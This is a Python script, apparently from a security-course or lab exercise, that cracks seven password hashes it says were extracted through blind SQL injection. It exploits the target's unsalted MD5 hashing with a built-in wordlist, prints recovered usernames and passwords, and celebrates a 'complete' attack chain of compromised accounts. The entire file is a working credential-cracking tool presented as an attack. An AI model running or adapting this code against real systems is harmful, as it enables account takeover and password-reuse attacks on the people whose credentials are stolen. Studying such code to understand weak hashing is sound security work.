#!/usr/bin/env python3
"""
CRACK ALL EXTRACTED HASHES
Use all the hashes extracted from blind SQL injection to crack passwords.
"""

import hashlib
import base64
import time
from typing import List, Tuple, Dict

class MultiHashCracker:
    def __init__(self):
        # All extracted hashes from the SQL injection
        self.extracted_hashes = {
            "testuser1": "YUS5-7EnygxDBUDqohINTw.X03MO1qnZdYdgyfeuILPmQ",
            "testuser2": "8It3tEkGbKoRvfWLGMID4A.ISMvKXpXpadDiUoOSoAfww", 
            "testuser3": "MQUUoy5Jt3LfQvnt3gFi9w.4QrcOUm6Wau-VuBX8g-IPg",
            "testuser4": "5phC5yUKDTjHYBAS1927EA.Y4TishhLy_WOzPEMp6ZWPA",
            "testuser5": "QyrK__OwTp2ckTkS7hvqEA.2FeO34RYzgb7xbt2pYxcpA",
            "admin": "0ni2i8iVVA9sHXvHZL59sA.CY9rzUYh03PK3k6DJie09g",
            "alice": "ZcuC0MCy0qLzAgz_QS6jmw.vtEoNlIWwBmYiRXtOt11-w"
        }
        self.cracked_passwords = {}
        
    def decode_password_hash(self, stored_hash: str) -> Tuple[bytes, bytes]:
        """Decode the stored password hash format."""
        try:
            salt_b64u, hash_b64u = stored_hash.split(".")
            salt = base64.urlsafe_b64decode(salt_b64u + "==")  # Add padding
            password_hash = base64.urlsafe_b64decode(hash_b64u + "==")
            return salt, password_hash
        except Exception as e:
            print(f"Error decoding hash: {e}")
            return None, None
    
    def md5_hash_password(self, password: str, salt: bytes) -> bytes:
        """Hash a password using MD5 WITHOUT salt (matches server vulnerability)."""
        # The server ignores the salt completely - this is the vulnerability!
        return hashlib.md5(password.encode("utf-8")).digest()
    
    def generate_wordlist(self) -> List[str]:
        """Generate comprehensive password list."""
        return [
            # Test user passwords you created
            "password", "admin", "123456", "alice", "qwerty",
            
            # Other common passwords
            "123456789", "12345678", "12345", "1234567", "password123",
            "admin123", "root", "user", "guest", "test", "demo",
            "letmein", "welcome", "hello", "world", "computer",
            "root123", "user123", "test123", "demo123",
            
            # Names
            "bob", "charlie", "david", "eve", "frank", "john", "jane",
            "mike", "sarah", "tom", "lisa",
            
            # Simple patterns
            "111111", "000000", "123123", "654321", "qwerty123",
            "monkey", "dragon", "master",
            
            # Years
            "2023", "2022", "2021", "2020", "2019", "2018",
            
            # App specific
            "socp", "secure", "programming", "hack", "security"
        ]
    
    def crack_all_passwords(self):
        """Crack all extracted password hashes."""
        print("🔓 CRACKING ALL EXTRACTED PASSWORD HASHES")
        print("=" * 70)
        
        wordlist = self.generate_wordlist()
        print(f"📚 Testing {len(wordlist)} passwords against {len(self.extracted_hashes)} users")
        print()
        
        total_start = time.time()
        
        for username, stored_hash in self.extracted_hashes.items():
            print(f"🎯 CRACKING: {username}")
            print(f"   Hash: {stored_hash}")
            
            # Decode hash
            salt, target_hash = self.decode_password_hash(stored_hash)
            if not salt or not target_hash:
                print(f"   ❌ Failed to decode hash")
                continue
                
            # Try each password
            start_time = time.time()
            found = False
            
            for i, password in enumerate(wordlist):
                candidate_hash = self.md5_hash_password(password, salt)
                
                if candidate_hash == target_hash:
                    elapsed = time.time() - start_time
                    print(f"   🎉 SUCCESS! Password: '{password}'")
                    print(f"   ⏱️  Time: {elapsed:.3f}s, Attempts: {i+1}/{len(wordlist)}")
                    self.cracked_passwords[username] = password
                    found = True
                    break
            
            if not found:
                elapsed = time.time() - start_time
                print(f"   ❌ Password not found ({elapsed:.3f}s)")
                
            print()
        
        total_elapsed = time.time() - total_start
        
        # Summary
        print("📊 CRACKING RESULTS SUMMARY")
        print("=" * 50)
        print(f"⏱️  Total time: {total_elapsed:.3f} seconds")
        print(f"✅ Successfully cracked: {len(self.cracked_passwords)}/{len(self.extracted_hashes)} passwords")
        print()
        
        if self.cracked_passwords:
            print("🔑 CRACKED CREDENTIALS:")
            for username, password in self.cracked_passwords.items():
                print(f"   {username} : {password}")
            
            print(f"\n🚨 SECURITY BREACH ANALYSIS:")
            print("🔓 Compromised accounts can be used for:")
            print("   - Direct system access")
            print("   - Password reuse attacks on other accounts")
            print("   - Privilege escalation attempts")
            print("   - Lateral movement within the system")
            
        return self.cracked_passwords

def main():
    print("🎯 MULTI-USER PASSWORD CRACKING")
    print("Using all hashes extracted from blind SQL injection")
    print("=" * 70)
    
    cracker = MultiHashCracker()
    results = cracker.crack_all_passwords()
    
    if results:
        print(f"\n💀 ATTACK CHAIN COMPLETE!")
        print("✅ SQL Injection → Hash Extraction → Password Cracking")
        print("✅ Multiple user accounts compromised")
        print("✅ System security completely breached")
    else:
        print(f"\n💡 Consider expanding the wordlist for better results")

if __name__ == "__main__":
    main()